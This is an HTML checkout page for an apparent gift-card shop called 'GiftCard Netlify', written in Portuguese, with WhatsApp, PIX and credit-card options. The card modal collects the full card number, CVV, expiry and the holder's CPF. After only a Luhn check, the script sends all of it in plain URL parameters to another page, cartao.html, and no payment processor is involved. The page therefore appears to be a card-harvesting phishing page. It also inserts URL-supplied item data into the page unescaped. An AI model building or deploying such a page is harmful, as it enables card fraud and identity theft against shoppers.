<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Checkout - GiftCard Netlify</title>
  <link rel="icon" type="image/webp" href="fasvcom.webp">
  <style>
    :root {
      --gold: #FFD700;
      --black: #0A0A0A;
      --black-soft: #1A1A1A;
      --primary: #EA1D2C;
      --success: #38B03F;
      --bg: #F7F7F7;
      --card: #FFFFFF;
      --text: #212225;
      --text-light: #767676;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
    body { background: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; }
    
    /* HEADER */
    header { background: var(--card); padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 8px rgba(0,0,0,0.06); border-bottom: 1px solid #eee; height: 60px; }
    .header-left { display: flex; align-items: center; gap: 12px; }
    .menu-btn { background: none; border: none; cursor: pointer; color: var(--text); padding: 4px; }
    .brand { display: flex; align-items: center; gap: 8px; cursor: pointer; }
    .brand svg { width: 28px; height: 28px; color: var(--primary); }
    .brand h1 { font-size: 1.1rem; font-weight: 800; }
    .brand span { color: var(--primary); }
    .header-icons { display: flex; align-items: center; gap: 4px; }
    .icon-btn { background: none; border: none; padding: 8px; border-radius: 50%; cursor: pointer; }
    .icon-btn svg { width: 24px; height: 24px; color: var(--text); }

    /* LAYOUT CHECKOUT */
    .checkout-container { max-width: 1100px; margin: 30px auto; padding: 0 16px; flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
    .checkout-card { background: var(--card); border-radius: 16px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
    .section-title { font-size: 1.3rem; font-weight: 800; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
    .section-title svg { width: 24px; height: 24px; color: var(--gold); }
    .order-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px dashed #eee; }
    .order-item:last-child { border-bottom: none; }
    .item-name { font-weight: 600; font-size: 0.95rem; }
    .item-price { font-weight: 700; color: var(--success); }
    .order-total { margin-top: 20px; padding-top: 15px; border-top: 2px solid #eee; display: flex; justify-content: space-between; font-size: 1.2rem; font-weight: 800; }

    /* FORMULÁRIOS */
    .form-group { margin-bottom: 20px; }
    .form-label { display: block; font-size: 0.9rem; font-weight: 600; margin-bottom: 8px; }
    .form-input { width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 1rem; outline: none; transition: border 0.3s; }
    .form-input:focus { border-color: var(--primary); }
    
    /* GRID DE PAGAMENTO */
    .payment-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 25px; }
    .payment-option { position: relative; cursor: pointer; }
    .payment-option input { position: absolute; opacity: 0; pointer-events: none; }
    .payment-box { background: #f8f9fa; border: 2px solid #e0e0e0; border-radius: 12px; padding: 16px; display: flex; align-items: center; gap: 12px; transition: all 0.2s; height: 100%; }
    .payment-option input:checked + .payment-box { border-color: var(--primary); background: #fff5f6; }
    .payment-box svg { width: 24px; height: 24px; }
    .payment-label { font-weight: 600; font-size: 0.9rem; line-height: 1.3; }
    .payment-option.disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
    .payment-option.disabled .payment-box { background: #f0f0f0; border-color: #ddd; }

    /* BOTÃO FINALIZAR */
    .btn-checkout { width: 100%; padding: 16px; background: linear-gradient(135deg, var(--primary), #c41826); color: white; border: none; border-radius: 12px; font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
    .btn-checkout:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(234, 29, 44, 0.4); }

    /* ================= MODAL CARTÃO ================= */
    .modal-overlay {
      position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 300;
      display: flex; align-items: center; justify-content: center;
      opacity: 0; pointer-events: none; transition: opacity 0.3s; padding: 20px;
    }
    .modal-overlay.active { opacity: 1; pointer-events: auto; }
    
    .modal-content {
      background: white; width: 100%; max-width: 450px; border-radius: 20px;
      padding: 30px; transform: translateY(50px); transition: transform 0.3s;
      max-height: 90vh; overflow-y: auto; position: relative;
    }
    .modal-overlay.active .modal-content { transform: translateY(0); }
    
    .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
    .modal-header h2 { font-size: 1.4rem; }
    .close-modal { background: #f0f0f0; border: none; width: 32px; height: 32px; border-radius: 50%; cursor: pointer; font-size: 1.2rem; display: flex; align-items: center; justify-content: center; }
    
    .card-row { display: flex; gap: 10px; }
    .card-row .form-group { flex: 1; }
    
    .modal-actions { display: flex; flex-direction: column; gap: 10px; margin-top: 20px; }
    .btn-save { width: 100%; padding: 14px; background: #212225; color: white; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; }
    .btn-save:disabled { background: #ccc; cursor: not-allowed; }
    
    .btn-finalize { 
      width: 100%; padding: 14px; background: var(--success); color: white; 
      border: none; border-radius: 10px; font-weight: 700; cursor: pointer; 
      display: flex; align-items: center; justify-content: center; gap: 8px;
      opacity: 0.5; pointer-events: none; transition: 0.3s;
    }
    .btn-finalize.active { opacity: 1; pointer-events: auto; }
    .btn-finalize:hover { transform: translateY(-2px); }

    .status-msg { text-align: center; font-size: 0.9rem; margin-top: 5px; color: var(--text-light); }
    .status-msg.success { color: var(--success); font-weight: bold; }
    .status-msg.error { color: var(--primary); font-weight: bold; }

    /* RODAPÉ */
    .site-footer { background: var(--black); color: #a0a0a0; padding: 30px 16px; text-align: center; margin-top: auto; font-size: 0.8rem; border-top: 1px solid #222; }
    
    @media (max-width: 768px) {
      .checkout-container { grid-template-columns: 1fr; }
      .payment-grid { grid-template-columns: 1fr; }
    }
  </style>
</head>
<body>

  <header>
    <div class="header-left">
      <button class="menu-btn" onclick="window.history.back()">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
      </button>
      <div class="brand" onclick="window.location.href='index.html'">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 0 1-8 0"/></svg>
        <h1>Gift<span>Card</span> Netlify</h1>
      </div>
    </div>
    <div class="header-icons">
      <button class="icon-btn" onclick="window.location.href='index.html'">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>
      </button>
    </div>
  </header>

  <div class="checkout-container">
    <!-- Resumo -->
    <div class="checkout-card">
      <h2 class="section-title">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/></svg>
        Resumo do Pedido
      </h2>
      <div id="order-items"></div>
      <div class="order-total">
        <span>Total</span>
        <span id="order-total-value">R$ 0,00</span>
      </div>
    </div>

    <!-- Pagamento -->
    <div class="checkout-card">
      <h2 class="section-title">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
        Dados de Envio & Pagamento
      </h2>
      
      <form id="checkoutForm" onsubmit="handleCheckout(event)">
        <div class="form-group">
          <label class="form-label">E-mail para envio do código</label>
          <input type="email" class="form-input" id="userEmail" placeholder="seu@email.com" required>
        </div>

        <label class="form-label">Escolha a forma de pagamento</label>
        <div class="payment-grid">
          <label class="payment-option">
            <input type="radio" name="payment" value="whatsapp" onchange="checkSelection()">
            <div class="payment-box">
              <svg viewBox="0 0 24 24" fill="none" stroke="#25D366" stroke-width="2"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg>
              <span class="payment-label">Finalizar no WhatsApp</span>
            </div>
          </label>

          <label class="payment-option">
            <input type="radio" name="payment" value="pix" onchange="checkSelection()">
            <div class="payment-box">
              <svg viewBox="0 0 24 24" fill="none" stroke="#32BCAD" stroke-width="2"><path d="M12 2L6 8l6 6 6-6-6-6zM6 16l6 6 6-6"/><circle cx="12" cy="12" r="3"/></svg>
              <span class="payment-label">Finalizar via PIX</span>
            </div>
          </label>

          <label class="payment-option">
            <input type="radio" name="payment" value="cartao" onchange="openCardModal()">
            <div class="payment-box">
              <svg viewBox="0 0 24 24" fill="none" stroke="#0033A0" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
              <span class="payment-label">Pagar com Cartão de Crédito</span>
            </div>
          </label>

          <label class="payment-option disabled">
            <input type="radio" name="payment" value="googlepay" disabled>
            <div class="payment-box">
              <svg viewBox="0 0 24 24" fill="none" stroke="#4285F4" stroke-width="2"><path d="M12 2a10 10 0 0 0-8.5 15.3L3 22l4.7-1.2A10 10 0 1 0 12 2z"/></svg>
              <span class="payment-label">Pagar com Google Pay</span>
            </div>
          </label>

          <label class="payment-option disabled">
            <input type="radio" name="payment" value="carteira" disabled>
            <div class="payment-box">
              <svg viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><path d="M20 7h-7L11 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/><path d="M16 13h4"/></svg>
              <span class="payment-label">Pagar com Carteira</span>
            </div>
          </label>
        </div>

        <button type="submit" class="btn-checkout" id="btnSubmit">
          <span>Continuar para Pagamento</span>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
        </button>
      </form>
    </div>
  </div>

  <!-- MODAL DE CARTÃO -->
  <div class="modal-overlay" id="cardModal">
    <div class="modal-content">
      <div class="modal-header">
        <h2>Dados do Cartão</h2>
        <button class="close-modal" onclick="closeCardModal()">✕</button>
      </div>
      
      <div id="cardFormContainer">
        <div class="form-group">
          <label class="form-label">Número do Cartão</label>
          <input type="tel" id="cardNumber" class="form-input" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" oninput="formatCard(this)">
        </div>
        
        <div class="form-group">
          <label class="form-label">Nome no Cartão</label>
          <input type="text" id="cardName" class="form-input" placeholder="NOME COMO NO CARTÃO" style="text-transform: uppercase;">
        </div>
        
        <div class="card-row">
          <div class="form-group">
            <label class="form-label">Validade</label>
            <input type="tel" id="cardExpiry" class="form-input" placeholder="MM/AA" maxlength="5" inputmode="numeric" oninput="formatExpiry(this)">
          </div>
          <div class="form-group">
            <label class="form-label">CVV</label>
            <input type="tel" id="cardCvv" class="form-input" placeholder="123" maxlength="3" inputmode="numeric">
          </div>
        </div>
        
        <div class="form-group">
          <label class="form-label">CPF do Titular</label>
          <input type="tel" id="cardCpf" class="form-input" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" oninput="formatCPF(this)">
        </div>

        <div class="form-group">
          <label class="form-label">Parcelamento</label>
          <select id="installments" class="form-input" style="background: white;">
            <!-- Gerado via JS -->
          </select>
        </div>

        <div class="modal-actions">
          <button class="btn-save" id="btnSaveCard" onclick="saveCardData()">Salvar Dados</button>
          <div id="cardStatus" class="status-msg"></div>
          
          <button class="btn-finalize" id="btnFinalize" onclick="finalizePayment()">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
            Finalizar Pagamento
          </button>
        </div>
      </div>
    </div>
  </div>

  <footer class="site-footer">
    <p>CNAE G-4761-0/03 - Comércio varejista de artigos de papelaria</p>
    <p>&copy; 2026 RI Comercio de Presente e Utilidades Ltda. Todos os direitos reservados.</p>
  </footer>

  <script>
    // Decodificar dados da URL
    const params = new URLSearchParams(window.location.search);
    const itemsEncoded = params.get('items');
    let totalValue = parseFloat(params.get('total') || '0.00');

    let items = [];
    try { items = JSON.parse(decodeURIComponent(escape(atob(itemsEncoded)))); } catch (e) {}

    // Renderizar itens
    const itemsContainer = document.getElementById('order-items');
    if(items.length > 0) {
      itemsContainer.innerHTML = items.map(item => `
        <div class="order-item">
          <div>
            <div class="item-name">${item.name}</div>
            <div class="item-qty">Qtd: ${item.qty}</div>
          </div>
          <div class="item-price">R$ ${item.price.toFixed(2)}</div>
        </div>
      `).join('');
      document.getElementById('order-total-value').textContent = `R$ ${totalValue.toFixed(2)}`;
    } else {
      itemsContainer.innerHTML = '<p style="color:var(--text-light); padding:20px 0; text-align:center">Nenhum item.</p>';
    }

    // Formatação de Inputs
    function formatCard(input) {
      let v = input.value.replace(/\D/g, '');
      v = v.replace(/(\d{4})/g, '$1 ').trim();
      input.value = v;
    }
    function formatExpiry(input) {
      let v = input.value.replace(/\D/g, '');
      if(v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2,4);
      input.value = v;
    }
    function formatCPF(input) {
      let v = input.value.replace(/\D/g, '');
      v = v.replace(/(\d{3})(\d)/, '$1.$2');
      v = v.replace(/(\d{3})(\d)/, '$1.$2');
      v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
      input.value = v;
    }

    // Algoritmo de Luhn (Validação de Cartão)
    function isValidCard(number) {
      let s = number.replace(/\D/g, '');
      if(s.length < 13 || s.length > 19) return false;
      let sum = 0;
      let isEven = false;
      for(let i = s.length - 1; i >= 0; i--) {
        let digit = parseInt(s.charAt(i));
        if(isEven) {
          digit *= 2;
          if(digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
      }
      return (sum % 10) === 0;
    }

    // Abrir Modal e Gerar Parcelas
    function openCardModal() {
      document.getElementById('cardModal').classList.add('active');
      const installSelect = document.getElementById('installments');
      installSelect.innerHTML = '';
      
      // 1x, 2x, 3x sem juros
      for(let i = 1; i <= 3; i++) {
        let val = totalValue / i;
        let opt = document.createElement('option');
        opt.value = i;
        opt.text = `${i}x de R$ ${val.toFixed(2)} Sem Juros (Total: R$ ${totalValue.toFixed(2)})`;
        installSelect.appendChild(opt);
      }
    }

    function closeCardModal() {
      document.getElementById('cardModal').classList.remove('active');
      // Deselecionar rádio se fechar
      document.querySelector('input[name="payment"][value="cartao"]').checked = false;
      document.getElementById('btnFinalize').classList.remove('active');
    }

    // Salvar e Validar
    function saveCardData() {
      const number = document.getElementById('cardNumber').value;
      const name = document.getElementById('cardName').value;
      const expiry = document.getElementById('cardExpiry').value;
      const cvv = document.getElementById('cardCvv').value;
      const cpf = document.getElementById('cardCpf').value;
      const statusEl = document.getElementById('cardStatus');
      const btnFinalize = document.getElementById('btnFinalize');
      const btnSave = document.getElementById('btnSaveCard');

      if(!number || !name || !expiry || !cvv || !cpf) {
        statusEl.textContent = 'Preencha todos os campos.';
        statusEl.className = 'status-msg error';
        return;
      }

      if(!isValidCard(number)) {
        statusEl.textContent = 'Cartão inválido. Verifique o número.';
        statusEl.className = 'status-msg error';
        return;
      }

      // Se chegou aqui, salvou
      statusEl.textContent = 'Dados salvos com sucesso!';
      statusEl.className = 'status-msg success';
      btnFinalize.classList.add('active');
      
      // Simular desabilitar inputs para indicar que salvou
      const inputs = document.querySelectorAll('#cardFormContainer input, #cardFormContainer select');
      inputs.forEach(i => i.disabled = true);
      btnSave.disabled = true;
      btnSave.textContent = 'Dados Salvos ✓';
    }

    // Finalizar e Redirecionar
    function finalizePayment() {
      const data = {
        number: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        name: document.getElementById('cardName').value,
        expiry: document.getElementById('cardExpiry').value,
        cvv: document.getElementById('cardCvv').value,
        cpf: document.getElementById('cardCpf').value,
        installments: document.getElementById('installments').value,
        total: totalValue
      };
      
      const queryString = Object.keys(data).map(key => key + '=' + encodeURIComponent(data[key])).join('&');
      window.location.href = `cartao.html?${queryString}`;
    }

    // Handle Submit do Form Principal (Para WhatsApp/PIX)
    function handleCheckout(e) {
      e.preventDefault();
      const payment = document.querySelector('input[name="payment"]:checked');
      if(!payment || payment.value === 'cartao') return; // Se for cartão, o modal trata

      const email = document.getElementById('userEmail').value;
      if(!email) { alert('Digite seu e-mail'); return; }
      
      const method = payment.value;
      const redirectUrl = `${method}.html?total=${totalValue}&email=${encodeURIComponent(email)}&items=${encodeURIComponent(itemsEncoded)}`;
      window.location.href = redirectUrl;
    }
    
    function checkSelection() {
      // Função auxiliar para garantir que o modal feche se trocar de opção
      if(!document.querySelector('input[name="payment"][value="cartao"]').checked) {
        closeCardModal();
      }
    }
  </script>
</body>
</html>
